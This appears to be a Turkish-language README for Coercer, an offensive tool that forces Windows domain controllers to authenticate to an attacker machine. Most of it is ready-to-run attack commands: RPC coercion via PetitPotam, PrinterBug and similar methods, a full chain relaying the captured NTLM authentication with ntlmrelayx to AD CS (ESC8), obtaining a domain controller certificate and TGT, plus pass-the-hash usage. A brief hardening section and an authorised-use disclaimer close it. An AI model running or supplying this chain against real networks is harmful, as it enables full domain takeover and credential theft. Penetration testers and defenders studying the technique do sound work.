# 🪓 Coercer - Kapsamlı Başvuru Kılavuzu

[🇬🇧 English Version](../README.md)

```
   ██████╗ ██████╗ ███████╗██████╗  ██████╗███████╗██████╗ 
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗
  ██║     ██║   ██║█████╗  ██████╔╝██║     █████╗  ██████╔╝
  ██║     ██║   ██║██╔══╝  ██╔══██╗██║     ██╔══╝  ██╔══██╗
  ╚██████╗╚██████╔╝███████╗██║  ██║╚██████╗███████╗██║  ██║
   ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
       Active Directory Çoklu Protokol Windows Kimlik Doğrulama Zorlama Motoru
```

<p align="center">
  <img src="https://img.shields.io/badge/Coercer-RPC_Zorlama-blue?style=for-the-badge" alt="Coercer">
  <img src="https://img.shields.io/badge/Geliştirici-p0dalirius-orange?style=for-the-badge" alt="p0dalirius">
  <img src="https://img.shields.io/badge/Kategori-Active_Directory_&_Ağ-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/Lisans-GPLv3-red?style=for-the-badge" alt="Lisans GPLv3">
</p>

<p align="center">
  <b>🌐 Windows sunucularını ve Domain Controller'ları 12'den fazla RPC protokolü üzerinden saldırgan makineye NTLM doğrulaması göndermeye zorlayan araç</b>
</p>

---

## 📋 İçindekiler

- [Genel Bakış & Kimlik Doğrulama Zorlama (Coercion) Mantığı](#-genel-bakış--kimlik-doğrulama-zorlama-coercion-mantığı)
- [Desteklenen RPC Protokolleri & Yöntemler](#-desteklenen-rpc-protokolleri--yöntemler)
- [Kurulum](#-kurulum)
- [Zafiyetli RPC Arayüzlerini Tarama (`scan`)](#-zafiyetli-rpc-arayüzlerini-tarama-scan)
- [Kimlik Doğrulamayı Tetikleme (`coerce`)](#-kimlik-doğrulamayı-tetikleme-coerce)
- [Tam Saldırı Zinciri: Coercion -> NTLM Relay -> AD CS ESC8](#-tam-saldırı-zinciri-coercion---ntlm-relay---ad-cs-esc8)
- [Protokol ve Yöntem Filtreleme](#-protokol-ve-yöntem-filtreleme)
- [Kerberos & Pass-the-Hash Desteği](#-kerberos--pass-the-hash-desteği)
- [Hızlı Referans Tablosu](#-hızlı-referans-tablosu)
- [Savunma Açısından Değerlendirme & Sıkılaştırma](#-savunma-açısından-değerlendirme--sıkılaştırma)
- [Yasal Uyarı](#-yasal-uyarı)

---

## 🎯 Genel Bakış & Kimlik Doğrulama Zorlama (Coercion) Mantığı

Active Directory ortamlarında **kimlik doğrulama zorlama (Authentication Coercion)**, domain ele geçirmede en etkili tekniklerden biridir. Windows servislerindeki eski RPC arayüzleri, standart bir domain kullanıcısının hedef sunucuya (örneğin bir Domain Controller'a) harici bir UNC paylaşımına (`\\saldirgan\paylasim`) bağlanma çağrısı yapmasına izin verir.

Hedef makine bu çağrıyı aldığında, saldırgan makineye kendi **makine hesabı (`DC01$`) ile NTLM kimlik doğrulaması** başlatır.

Saldırgan bu gelen NTLM doğrulamasını `ntlmrelayx` ile Active Directory Sertifika Hizmetleri'ne (AD CS Web Kaydı - ESC8) veya kısıtlanmamış delegasyon sunucularına aktararak (relay) dakikalar içinde **tüm Domain'i tam yetkiyle (Domain Admin)** ele geçirebilir.

**Clément Notin (p0dalirius)** tarafından yazılan **Coercer**, piyasadaki tüm zorlama istismarlarını (PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce) tek bir modüler çatıda toplar.

---

## 🔌 Desteklenen RPC Protokolleri & Yöntemler

| Protokol Adı | Bilinen İstismar Adı | Boru / Arayüz |
|--------------|----------------------|---------------|
| **MS-EFSRPC** | PetitPotam | `\pipe\efsrpc`, `\pipe\lsarpc` |
| **MS-RPRN** | PrinterBug / SpoolSample | `\pipe\spoolss` |
| **MS-FSRVP** | ShadowCoerce | `\pipe\FSRVP` |
| **MS-DFSNM** | DFSCoerce | `\pipe\netdfs` |
| **MS-PAN** | PrintNightmare türevi | Remote Print Administration |
| **MS-SAMR** | Cheeseing | Security Account Manager |

---

## 📥 Kurulum

```bash
# Pipx ile Kurulum (Önerilen)
pipx install coercer

# Standart Pip ile
pip3 install coercer

# GitHub Kaynak Kodundan
git clone https://github.com/p0dalirius/Coercer.git
cd Coercer
pip3 install -r requirements.txt
python3 Coercer.py --help
```

---

## 🔍 Zafiyetli RPC Arayüzlerini Tarama (`scan`)

Tetikleme yapmadan önce Domain Controller üzerindeki açık ve yanıt veren RPC işlevlerini listelemek için:

```bash
# Tek bir Domain Controller'ı tarama
coercer scan -u 'testuser' -p 'Parola123' -d 'corp.local' -t 10.10.10.1

# Çoklu DC listesini tarama
coercer scan -u 'testuser' -p 'Parola123' -d 'corp.local' --targets-file dc_listesi.txt
```

---

## ⚡ Kimlik Doğrulamayı Tetikleme (`coerce`)

DC'yi kendi makinenize (`10.10.14.5`) NTLM doğrulaması yapmaya zorlayın:

```bash
# Hedef DC'yi (10.10.10.1) saldırgan dinleyicisine bağlatma
coercer coerce -u 'testuser' -p 'Parola123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5
```

---

## 💥 Tam Saldırı Zinciri: Coercion -> NTLM Relay -> AD CS ESC8

En yaygın ve etkili kurumsal sömürü zinciri:

```bash
# 1. Saldırgan makinede AD CS Web Kayıt servisine yönelik ntlmrelayx dinleyicisi başlatılır
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2. Coercer ile hedef DC'den saldırgan makineye çağrı tetiklenir
coercer coerce -u 'dusuk_yetkili_user' -p 'Pass123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# 3. ntlmrelayx DC01$ bağlantısını yakalar ve CA sunucusundan geçerli bir base64 sertifika üretir!

# 4. Üretilen sertifika ile gettgtpkinit (PKINITtools) üzerinden DC adına Domain Admin TGT bileti alınır
gettgtpkinit.py corp.local/DC01\$ -pfx-base64 <BASE64_SERTIFIKA> dc01.ccache
```

---

## 🎯 Protokol ve Yöntem Filtreleme

Tüm RPC arayüzlerini tarayıp gürültü yaratmak yerine tek bir hedefe odaklanın:

```bash
# Yalnızca PetitPotam (MS-EFSRPC) üzerinden tetikleme yap
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-EFSRPC

# Yalnızca PrinterBug (MS-RPRN) üzerinden tetikleme yap
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-RPRN
```

---

## 🔑 Kerberos & Pass-the-Hash Desteği

```bash
# NTLM Hash ile çalıştırma (Pass-the-Hash)
coercer coerce -u 'user' --hashes :aad3b435b51404eeaad3b435b51404ee:7fc508... -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# Kerberos bileti (KRB5CCNAME) ile çalıştırma
export KRB5CCNAME=/tmp/user.ccache
coercer coerce -k -no-pass -d 'corp.local' -t dc01.corp.local -l 10.10.14.5
```

---

## ⚡ Hızlı Referans Tablosu

| İşlem | Komut |
|-------|-------|
| **Zorlama Potansiyelini Tara**| `coercer scan -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP>` |
| **Kimlik Doğrulamayı Zorla** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <SALDIRGAN_IP>` |
| **Yalnızca MS-EFSRPC ile** | `coercer coerce -u <U> -p <P> -d <D> -t <DC> -l <IP> --filter-protocol-name MS-EFSRPC` |
| **Yalnızca MS-RPRN ile** | `coercer coerce -u <U> -p <P> -d <D> -t <DC> -l <IP> --filter-protocol-name MS-RPRN` |
| **Pass-the-Hash ile Zorla** | `coercer coerce -u <U> --hashes :<NTLM> -d <D> -t <DC> -l <IP>` |
| **Kerberos Bileti ile Zorla** | `coercer coerce -k -no-pass -d <D> -t <DC_FQDN> -l <IP>` |

---

## 🛡️ Savunma Açısından Değerlendirme & Sıkılaştırma

1. **DC'lerde Yazıcı Biriktiricisini (Print Spooler) Kapatın:** `spoolsv.exe` servisi Domain Controller'larda tamamen devre dışı bırakılmalıdır.
2. **EPA (Extended Protection for Authentication):** AD CS Web Enrollment arayüzlerinde NTLM Relay saldırılarını engellemek için EPA ve HTTPS zorunlu tutulmalıdır.
3. **RPC Uç Nokta Filtreleme:** TCP 135 portuna erişim yalnızca yetkili yönetim alt ağlarıyla sınırlandırılmalıdır.

---

## ⚠️ Yasal Uyarı

> [!CAUTION]
> Coercer hedef işletim sisteminde uzaktan RPC çağrıları tetikler. Yamasız eski sistemlerde servislerin kilitlenmesine neden olabilir. Yalnızca yazılı izin alınan yetkili sızma testlerinde kullanılmalıdır.